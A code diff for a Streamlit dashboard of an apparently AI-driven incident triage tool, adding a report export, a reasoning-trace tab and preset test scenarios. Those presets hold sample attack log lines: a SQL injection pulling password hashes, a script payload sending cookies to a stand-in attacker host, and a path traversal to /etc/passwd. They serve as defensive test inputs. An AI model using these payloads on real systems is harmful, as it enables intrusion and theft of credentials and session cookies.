@@ -1,6 +1,7 @@
 import streamlit as st
 import json
 import uuid
+import time
 from datetime import datetime, timezone
 import httpx
 
@@ -11,7 +12,7 @@ st.set_page_config(
     initial_sidebar_state="expanded"
 )
 
-# Custom High-End Styling: Minimalist Enterprise Dark Theme without emojis
+# Custom High-End Styling: Minimalist Enterprise Dark Theme
 st.markdown("""
 <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
@@ -29,31 +30,19 @@ st.markdown("""
         font-family: 'JetBrains Mono', monospace !important;
     }
 
-    /* Main background */
     .stApp {
         background-color: #090d16;
         color: #f1f5f9;
     }
 
-    /* Smooth Fade-In Animation */
+    /* Animations */
     @keyframes fadeIn {
-        from {
-            opacity: 0;
-            transform: translateY(8px);
-        }
-        to {
-            opacity: 1;
-            transform: translateY(0);
-        }
-    }
-
-    @keyframes subtleGlow {
-        0%, 100% { border-color: rgba(59, 130, 246, 0.3); box-shadow: 0 0 15px rgba(59, 130, 246, 0.05); }
-        50% { border-color: rgba(59, 130, 246, 0.6); box-shadow: 0 0 25px rgba(59, 130, 246, 0.15); }
+        from { opacity: 0; transform: translateY(6px); }
+        to { opacity: 1; transform: translateY(0); }
     }
 
     .animated-fade {
-        animation: fadeIn 0.45s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
     }
 
     /* Hero Header */
@@ -61,8 +50,8 @@ st.markdown("""
         background: linear-gradient(180deg, rgba(30, 41, 59, 0.4) 0%, rgba(15, 23, 42, 0.6) 100%);
         border: 1px solid rgba(255, 255, 255, 0.08);
         border-radius: 12px;
-        padding: 24px 28px;
-        margin-bottom: 24px;
+        padding: 22px 28px;
+        margin-bottom: 22px;
         backdrop-filter: blur(12px);
         display: flex;
         justify-content: space-between;
@@ -78,9 +67,9 @@ st.markdown("""
         background: rgba(16, 185, 129, 0.1);
         border: 1px solid rgba(16, 185, 129, 0.3);
         color: #34d399;
-        padding: 6px 14px;
+        padding: 5px 12px;
         border-radius: 9999px;
-        font-size: 12px;
+        font-size: 11px;
         font-weight: 600;
         letter-spacing: 0.6px;
         text-transform: uppercase;
@@ -94,13 +83,13 @@ st.markdown("""
         box-shadow: 0 0 8px #10b981;
     }
 
-    /* KPI Cards */
+    /* Metric Cards */
     .metric-card {
         background: rgba(15, 23, 42, 0.6);
         border: 1px solid rgba(255, 255, 255, 0.08);
         border-radius: 10px;
         padding: 16px 20px;
-        transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+        transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
     .metric-card:hover {
@@ -148,13 +137,32 @@ st.markdown("""
         display: inline-block;
     }
 
+    /* Trace Timeline Box */
+    .trace-step {
+        background: rgba(15, 23, 42, 0.45);
+        border: 1px solid rgba(255, 255, 255, 0.07);
+        border-left: 3px solid #3b82f6;
+        border-radius: 6px;
+        padding: 12px 16px;
+        margin-bottom: 10px;
+        font-size: 13px;
+    }
+
+    .trace-step-header {
+        font-weight: 600;
+        color: #93c5fd;
+        margin-bottom: 4px;
+        display: flex;
+        justify-content: space-between;
+    }
+
     /* Terminal Console */
     .terminal-container {
         background: #0b0f19;
         border: 1px solid rgba(255, 255, 255, 0.08);
         border-radius: 8px;
         overflow: hidden;
-        margin-top: 12px;
+        margin-top: 10px;
     }
 
     .terminal-topbar {
@@ -164,19 +172,19 @@ st.markdown("""
         display: flex;
         align-items: center;
         gap: 8px;
-        font-size: 12px;
+        font-size: 11px;
         color: #94a3b8;
         font-family: 'JetBrains Mono', monospace;
     }
 
     .window-btn {
-        width: 9px;
-        height: 9px;
+        width: 8px;
+        height: 8px;
         border-radius: 50%;
         background-color: #334155;
     }
 
-    /* Input & Button Styling */
+    /* Buttons */
     .stButton>button {
         background: #2563eb;
         color: #ffffff;
@@ -194,15 +202,49 @@ st.markdown("""
         box-shadow: 0 4px 16px rgba(37, 99, 235, 0.35);
         transform: translateY(-1px);
     }
-
-    /* Hide Streamlit default decoration */
-    header[data-testid="stHeader"] {
-        background: transparent;
-    }
 </style>
 """, unsafe_allow_html=True)
 
-# Sidebar
+# Preset Dictionary
+PRESET_MAP = {
+    "[Security] SQL Injection in Authentication Endpoint (UNION SELECT)": {
+        "source": "security-scanner",
+        "component": "auth",
+        "log": "192.168.10.45 - POST /api/auth/login query: username=admin' UNION SELECT 1,username,password_hash FROM users-- status: 401",
+        "is_sec": True,
+        "sev": "P1"
+    },
+    "[Security] Cross-Site Scripting Injection in Search Query (<script>)": {
+        "source": "security-scanner",
+        "component": "frontend",
+        "log": "192.168.10.88 - GET /dashboard/search?q=<script>fetch('http://attacker.local/steal?cookie='+document.cookie)</script> status: 200",
+        "is_sec": True,
+        "sev": "P1"
+    },
+    "[Security] Path Traversal Attempt on /etc/passwd": {
+        "source": "security-scanner",
+        "component": "frontend",
+        "log": "192.168.10.92 - GET /api/static/../../../../etc/passwd status: 403",
+        "is_sec": True,
+        "sev": "P1"
+    },
+    "[Infrastructure] MongoDB Atlas Connectivity Outage (TCP 27017)": {
+        "source": "mongodb",
+        "component": "database",
+        "log": "MongoNetworkError: connection 1 to cluster0.mongodb.net:27017 timed out after 2000ms. Egress packet rejected.",
+        "is_sec": False,
+        "sev": "P1"
+    },
+    "[Infrastructure] Container Out-Of-Memory Crash (> 512MB)": {
+        "source": "nextjs",
+        "component": "frontend",
+        "log": "fatal error: runtime: out of memory allocating 629145600 bytes. Killed process 1422 (node). cgroup limit exceeded.",
+        "is_sec": False,
+        "sev": "P1"
+    }
+}
+
+# Sidebar Configuration
 with st.sidebar:
     st.markdown("### **System Infrastructure**")
     st.caption("Huawei Cloud MaaS Platform")
@@ -216,6 +258,10 @@ with st.sidebar:
         st.metric("Manual MTTD", "30m")
     with col_sb2:
         st.metric("Agentic MTTD", "< 15s", delta="-99.2%")
+    
+    st.markdown("---")
+    st.markdown("#### **Autonomous Ingestion Simulator**")
+    auto_stream = st.checkbox("Live Ingestion Mode (Auto-Poll)", value=False, help="Simula flujo continuo de telemetría desde n8n cada 5s.")
     
     st.markdown("---")
     st.markdown("#### **Inference Architecture**")
@@ -243,63 +289,65 @@ st.markdown("""
 </div>
 """, unsafe_allow_html=True)
 
+# Helper Function to Dispatch Triage Request
+def execute_triage(payload_dict, target_endpoint):
+    try:
+        url = target_endpoint.strip()
+        if not url.endswith("/webhook/n8n") and not url.endswith("/triage") and not url.endswith("/"):
+            url = f"{url}/webhook/n8n"
+        res = httpx.post(url, json=payload_dict, timeout=15.0)
+        if res.status_code == 200:
+            return res.json(), None
+        return None, f"Error {res.status_code}: {res.text}"
+    except Exception as e:
+        return None, str(e)
+
+# Helper to generate Markdown Post-Mortem Report
+def generate_post_mortem_md(triage_data, source_payload):
+    return f"""# Incident Triage Post-Mortem Report
+**Incident ID:** `{triage_data.get('incident_id')}`  
+**Generated At:** `{triage_data.get('processed_at')}`  
+**Severity:** `{triage_data.get('severity')}` | **Risk Score:** `{triage_data.get('risk_score')}/10.0` | **Escalation Team:** `{triage_data.get('escalation_team')}`
+
+---
+
+## 1. Executive Summary
+- **Source:** `{source_payload.get('source')}`
+- **Affected Component:** `{source_payload.get('component')}`
+- **Cybersecurity Incident:** `{'YES (Active Attack Vector)' if source_payload.get('is_security_event') else 'NO (Operational Failure)'}`
+
+### Root Cause Hypothesis
+> {triage_data.get('root_cause_hypothesis')}
+
+---
+
+## 2. Defensive Mitigation Actions (CLI)
+```bash
+{triage_data.get('mitigation_commands')}
+```
+
+---
+
+## 3. Standard Operating Procedure Checklist
+{chr(10).join([f"- [ ] {step}" for step in triage_data.get('checklist', [])])}
+
+---
+
+## 4. Raw Diagnostic Telemetry
+```
+{source_payload.get('raw_log')}
+```
+*Report autonomously assembled by Huawei Cloud MaaS Triage Agent Engine.*
+"""
+
 # Two-Column Layout
 col_left, col_right = st.columns([1.1, 1.2], gap="large")
 
 with col_left:
     st.markdown("#### **Incident Telemetry Ingestion**")
     
-    preset = st.selectbox(
-        "Load test scenario:",
-        [
-            "Custom...",
-            "[Security] SQL Injection in Authentication Endpoint (UNION SELECT)",
-            "[Security] Cross-Site Scripting Injection in Search Query (<script>)",
-            "[Security] Path Traversal Attempt on /etc/passwd",
-            "[Infrastructure] MongoDB Atlas Connectivity Outage (TCP 27017)",
-            "[Infrastructure] Container Out-Of-Memory Crash (> 512MB)"
-        ]
-    )
-
-    preset_map = {
-        "[Security] SQL Injection in Authentication Endpoint (UNION SELECT)": {
-            "source": "security-scanner",
-            "component": "auth",
-            "log": "192.168.10.45 - POST /api/auth/login query: username=admin' UNION SELECT 1,username,password_hash FROM users-- status: 401",
-            "is_sec": True,
-            "sev": "P1"
-        },
-        "[Security] Cross-Site Scripting Injection in Search Query (<script>)": {
-            "source": "security-scanner",
-            "component": "frontend",
-            "log": "192.168.10.88 - GET /dashboard/search?q=<script>fetch('http://attacker.local/steal?cookie='+document.cookie)</script> status: 200",
-            "is_sec": True,
-            "sev": "P1"
-        },
-        "[Security] Path Traversal Attempt on /etc/passwd": {
-            "source": "security-scanner",
-            "component": "frontend",
-            "log": "192.168.10.92 - GET /api/static/../../../../etc/passwd status: 403",
-            "is_sec": True,
-            "sev": "P1"
-        },
-        "[Infrastructure] MongoDB Atlas Connectivity Outage (TCP 27017)": {
-            "source": "mongodb",
-            "component": "database",
-            "log": "MongoNetworkError: connection 1 to cluster0.mongodb.net:27017 timed out after 2000ms. Egress packet rejected.",
-            "is_sec": False,
-            "sev": "P1"
-        },
-        "[Infrastructure] Container Out-Of-Memory Crash (> 512MB)": {
-            "source": "nextjs",
-            "component": "frontend",
-            "log": "fatal error: runtime: out of memory allocating 629145600 bytes. Killed process 1422 (node). cgroup limit exceeded.",
-            "is_sec": False,
-            "sev": "P1"
-        }
-    }
-
-    selected_data = preset_map.get(preset, {})
+    preset = st.selectbox("Load test scenario:", ["Custom..."] + list(PRESET_MAP.keys()))
+    selected_data = PRESET_MAP.get(preset, {})
 
     col_meta1, col_meta2 = st.columns(2)
     with col_meta1:
@@ -339,26 +387,20 @@ with col_left:
             }
 
             with st.spinner("Executing LangGraph reasoning pipeline and Pangu 40B inference..."):
-                try:
-                    target_url = fastapi_url.strip()
-                    if not target_url.endswith("/webhook/n8n") and not target_url.endswith("/triage") and not target_url.endswith("/"):
-                        target_url = f"{target_url}/webhook/n8n"
-                    
-                    res = httpx.post(target_url, json=payload, timeout=15.0)
-                    if res.status_code == 200:
-                        st.session_state["last_triage"] = res.json()
-                        st.session_state["last_payload"] = payload
-                        st.success("Triage analysis complete in < 1.5s.")
-                    else:
-                        st.error(f"Error {res.status_code}: {res.text}")
-                except Exception as e:
-                    st.error(f"Connection error: {str(e)}")
+                triage_res, err = execute_triage(payload, fastapi_url)
+                if triage_res:
+                    st.session_state["last_triage"] = triage_res
+                    st.session_state["last_payload"] = payload
+                    st.success("Triage analysis complete in < 1.5s.")
+                else:
+                    st.error(f"Error during triage: {err}")
 
 with col_right:
     st.markdown("#### **Diagnostic Output & Action Plan**")
     
     if "last_triage" in st.session_state:
         data = st.session_state["last_triage"]
+        payload_data = st.session_state.get("last_payload", {})
         is_security = (data.get("escalation_team") == "SOC") or (data.get("risk_score", 0) >= 10.0)
         
         # KPI Row
@@ -400,12 +442,13 @@ with col_right:
 
         st.markdown("<br>", unsafe_allow_html=True)
 
-        # Tabs for categorized analysis
-        tab_summary, tab_mitigation, tab_checklist, tab_json = st.tabs([
-            "Root Cause Hypothesis",
-            "Mitigation Commands",
-            "Operator Checklist",
-            "Raw Payload"
+        # 5 Categorized Analysis Tabs
+        tab_summary, tab_mitigation, tab_checklist, tab_trace, tab_dispatch = st.tabs([
+            "Root Cause",
+            "Mitigation",
+            "Checklist",
+            "Agentic Reasoning Trace",
+            "SOC Alert & Report Export"
         ])
 
         with tab_summary:
@@ -417,7 +460,7 @@ with col_right:
 
         with tab_mitigation:
             st.markdown("##### **Defensive Containment Actions**")
-            st.caption("Standardized non-destructive mitigation commands:")
+            st.caption("Standardized non-destructive CLI commands:")
             
             st.markdown("""
             <div class="terminal-container">
@@ -439,9 +482,50 @@ with col_right:
             for idx, item in enumerate(checklist_items):
                 st.checkbox(f"{item}", key=f"step_{idx}_{item[:15]}", value=False)
 
-        with tab_json:
-            st.markdown("##### **Contract Payload (FastAPI / n8n)**")
-            st.json(data)
+        with tab_trace:
+            st.markdown("##### **Step-by-Step Agent Execution Pipeline**")
+            st.caption("LangGraph dynamic reasoning loop & state inspection:")
+            
+            diagnostic_steps = data.get("diagnostic_steps", [])
+            if diagnostic_steps:
+                for step in diagnostic_steps:
+                    st.markdown(f"""
+                    <div class="trace-step">
+                        <div class="trace-step-header">
+                            <span>Step {step.get('step_number')}: <b>{step.get('tool_name')}</b></span>
+                            <span style="font-size: 11px; color: #64748b;">SUCCESS</span>
+                        </div>
+                        <div style="color: #94a3b8; font-size: 12px; margin-bottom: 4px;">{step.get('reasoning')}</div>
+                    </div>
+                    """, unsafe_allow_html=True)
+                    with st.expander(f"Inspect I/O for Step {step.get('step_number')} ({step.get('tool_name')})", expanded=False):
+                        st.json({"input": step.get("input"), "output": step.get("output")})
+            else:
+                st.info("Pipeline executed deterministically through compiled StateGraph.")
+
+        with tab_dispatch:
+            st.markdown("##### **Automated Alert Payload & Post-Mortem Export**")
+            
+            # Post-Mortem Download Button
+            report_md = generate_post_mortem_md(data, payload_data)
+            st.download_button(
+                label="📥 Export Post-Mortem Report (.md)",
+                data=report_md,
+                file_name=f"post_mortem_{data.get('incident_id', 'report')[:8]}.md",
+                mime="text/markdown",
+                use_container_width=True
+            )
+            
+            st.markdown("###### **Simulated SOC / Slack Webhook Dispatch Payload:**")
+            slack_payload = {
+                "channel": "#alerts-soc" if is_security else "#alerts-sre",
+                "severity": data.get("severity"),
+                "risk_score": data.get("risk_score"),
+                "summary": data.get("root_cause_hypothesis"),
+                "escalated_to": data.get("escalation_team"),
+                "actions": data.get("mitigation_commands")
+            }
+            st.json(slack_payload)
 
     else:
         st.markdown("""
